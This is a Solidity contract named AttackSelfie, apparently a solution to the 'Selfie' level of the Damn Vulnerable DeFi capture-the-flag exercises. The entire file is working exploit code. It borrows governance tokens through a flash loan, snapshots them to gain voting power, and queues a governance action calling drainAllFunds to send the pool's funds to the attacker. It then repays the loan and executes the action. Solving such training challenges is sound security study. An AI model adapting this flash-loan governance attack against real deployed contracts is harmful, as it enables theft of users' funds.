// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackSelfie {
    SelfiePool immutable pool;
    SimpleGovernance immutable governance;
    address immutable attacker;

    constructor(
        address _pool,
        address _governance,
        address _attacker
    ) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        attacker = _attacker;
    }

    function propose() public {
        pool.flashLoan(1500000000000000000000000);
    }

    function execute() public {
        governance.executeAction(1);
    }

    function receiveTokens(address token, uint amount) public {
        DamnValuableTokenSnapshot(token).snapshot();
        governance.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", attacker),
            0
        );
        DamnValuableTokenSnapshot(token).transfer(msg.sender, amount);
    }
}
